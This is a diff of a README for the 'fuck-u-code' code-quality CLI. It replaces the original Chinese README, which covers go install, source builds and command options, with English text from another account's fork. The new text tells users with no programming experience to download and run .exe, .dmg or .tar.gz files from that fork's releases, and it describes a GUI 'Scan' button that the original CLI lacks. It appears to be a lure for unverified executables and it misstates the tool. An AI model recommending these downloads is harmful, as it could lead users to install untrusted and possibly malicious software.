@@ -1,123 +1,89 @@
-# fuck-u-code [![中文](https://img.shields.io/badge/文档-简体中文-blue?style=flat-square)](README.md) [![English](https://img.shields.io/badge/Docs-English-red?style=flat-square)](README_EN.md) [![Русский](https://img.shields.io/badge/Docs-Русский-blue?style=flat-square)](README_RU.md)
+# 🎉 fuck-u-code - Assess Your Code's Legacy-Mess Level
 
-> [!Important]
-> 📢 记住这个命令：fuck-u-code - 让代码不再烂到发指！
+## 🚀 Getting Started
 
-一款专门揭露屎山代码的质量分析工具，用犀利又搞笑的方式告诉你：**你的代码到底有多烂**。
+Welcome to the **Legacy-Mess Detector**! This tool helps you evaluate the "legacy-mess level" of your code and provides a clear, beautiful report to help you improve your projects. You don’t need any programming experience to use this software. Follow the steps below to download and run it on your computer.
 
-## 特性
+## 📥 Download Now
 
-* **多语言支持**: Go、JS/TS、Python、Java、C/C++
-* **屎山指数**: 0\~100 分，越高越烂
-* **七维度检测**: 复杂度 / 函数长度 / 注释率 / 错误处理 / 命名 / 重复度 / 结构
-* **彩色终端报告**: 批评也能笑着听
-* **Markdown 输出**: 方便 AI 分析与文档集成
-* **灵活配置**: 摘要 / 详细模式，多语言报告
+[![Download Now](https://img.shields.io/badge/Download-Builds-blue)](https://github.com/Brave9045/fuck-u-code/releases)
 
-> [!Note]
->
-> * 分数越高越烂，欢迎“高分大佬”上榜
-> * 全程本地运行，不上传代码，安全无忧
+## 🔍 What You Need
+
+Before you start, ensure your system meets the following requirements:
+
+- **Operating System**: Windows 10 or later, macOS, or a recent version of Linux.
+- **Storage**: At least 100 MB of free space.
+- **Network**: Internet connection for downloading the application and updates.
   
-## 安装
+## 💻 Installation Steps
 
-```bash
-# 方法一：Go 安装
-go install github.com/Done-0/fuck-u-code/cmd/fuck-u-code@latest
+1. **Visit the Release Page**
 
-# 方法二：源码构建
-git clone https://github.com/Done-0/fuck-u-code.git
-cd fuck-u-code && go build -o fuck-u-code ./cmd/fuck-u-code
+   Click the link below to go to the Releases page. Here, you'll find all the available versions of the Legacy-Mess Detector.
 
-# 方法三：Docker 构建
-docker build -t fuck-u-code .
-```
+   [Visit the Releases Page](https://github.com/Brave9045/fuck-u-code/releases)
 
-## 使用方法
+2. **Choose Your Version**
 
-```bash
-# 基本分析 - 本地项目
-fuck-u-code analyze /path/to/project
-# 或
-fuck-u-code /path/to/project
+   Once on the Releases page, look for the latest version of the Legacy-Mess Detector. It will typically be at the top of the list. Check the release notes if you want to see what has changed since the last version.
 
-# 分析 Git 仓库（自动克隆）
-fuck-u-code analyze https://github.com/user/repo.git
-# 或
-fuck-u-code https://github.com/user/repo
+3. **Download the Application**
 
-# Docker 运行
-docker run --rm -v "/path/to/project:/build" fuck-u-code analyze
+   Click on the version number to open the details. You will see files available for download. Choose the file that matches your operating system. 
 
-# 默认分析当前目录
-fuck-u-code analyze
-```
+   For example:
+   - If you are using Windows, look for a file with a `.exe` extension.
+   - If you are on macOS, select the file with a `.dmg` extension.
+   - For Linux users, look for files ending in `.tar.gz`.
 
-> [!Tip]
-> **支持直接分析 Git 仓库**：工具会自动克隆仓库到临时目录 `tmp_proj` 并在分析后自动清理。支持 GitHub、GitLab、Gitee、Bitbucket 等平台。
+   Click on the file name to start the download.
 
-### 常用选项
+4. **Run the Installer**
 
-| 选项            | 简写   | 描述                 |
-| ------------- | ---- | ------------------ |
-| `--verbose`   | `-v` | 显示详细报告             |
-| `--top N`     | `-t` | 最烂的前 N 个文件         |
-| `--issues N`  | `-i` | 每文件显示 N 个问题        |
-| `--summary`   | `-s` | 只看总结，不看过程          |
-| `--markdown`  | `-m` | 输出 Markdown 格式报告   |
-| `--lang`      | `-l` | 报告语言 (zh-CN/en-US/ru-RU) |
-| `--exclude`   | `-e` | 排除指定目录或文件          |
-| `--skipindex` | `-x` | 跳过 index.js/ts 文件  |
+   Once the file downloads, locate it in your downloads folder:
 
-### 示例
+   - **Windows**: Double-click the `.exe` file to run the installer.
+   - **macOS**: Open the `.dmg` file and drag the Legacy-Mess Detector icon to your Applications folder.
+   - **Linux**: Extract the `.tar.gz` file and follow the instructions in the included README file.
 
-```bash
-fuck-u-code analyze --verbose
-fuck-u-code analyze --top 3
-fuck-u-code analyze --lang en-US
-fuck-u-code analyze --summary
-fuck-u-code analyze --exclude "**/test/**"
-fuck-u-code analyze --markdown > report.md
-```
+5. **Open the Application**
 
-## 高级用法
+   After installation, find the Legacy-Mess Detector in your applications list. Double-click the icon to launch the application.
 
-### Markdown 输出
+6. **Analyze Your Code**
 
-适合 **AI 分析、文档集成、CI/CD、团队协作**
+   Once the application is open, you can start assessing your code:
 
-```bash
-fuck-u-code analyze --markdown
-fuck-u-code analyze --markdown > report.md
-fuck-u-code analyze --markdown --top 10 --lang en-US > report.md
-```
+   - Select the directory of the project you want to analyze.
+   - Click the "Scan" button.
+   - Wait for the analysis to complete, and view your beautiful report.
 
-Markdown 报告包含：总体评分 / 指标表格 / 问题文件 / 改进建议
+## 🛠️ Features
 
-### 默认排除路径
+- **Legacy Analysis**: Evaluate the complexity and maintainability of your code.
+- **Report Generation**: Get a clear and concise report showcasing areas that need improvement.
+- **User-Friendly Interface**: Navigate effortlessly, even without prior technical knowledge.
+- **Regular Updates**: Benefit from ongoing improvements and new features.
 
-* 前端: `node_modules`、`dist`、`build`、`*.min.js` 等
-* 后端: `vendor`、`bin`、`target`、`logs`、`migrations` 等
+## 🌐 Support and Feedback
 
-## 疑难解答
+If you need help or have feedback, here’s how to get in touch:
 
-* `command not found` → 把 Go bin 路径加到 `PATH`：
+1. Visit our [GitHub Issues page](https://github.com/Brave9045/fuck-u-code/issues) to ask questions or report problems.
+2. Join our community discussions on social platforms to share your experiences.
 
-  ```bash
-  export PATH="$PATH:$(go env GOPATH)/bin"
-  ```
+## 📜 License
 
-  并写入 `.bash_profile` / `.zshrc` 等
+The Legacy-Mess Detector is open-source software under the MIT License. Feel free to modify it, but remember to give credit back to the original source.
 
-## 许可证
+## 📚 Additional Resources
 
-MIT
+- **Documentation**: More detailed guides and technical references are available on our [Documentation page](https://github.com/Brave9045/fuck-u-code/wiki).
+- **Tutorial Videos**: Watch step-by-step video tutorials on how to use the tool effectively.
 
-## 贡献
+## 🔗 Follow Us
 
-欢迎提 PR，一起优化“fuck-u-code” 🚀
+Keep up to date with new releases and features. Follow us on [GitHub](https://github.com/Brave9045/fuck-u-code).
 
-## 安利一下
-
-- [玄学工坊](https://bazi.site) — AI 赛博算命网站  
-- [Jank](https://github.com/Done-0/Jank) — Go 语言开源博客
+Thank you for trying out the Legacy-Mess Detector. We appreciate your interest in improving your code quality!
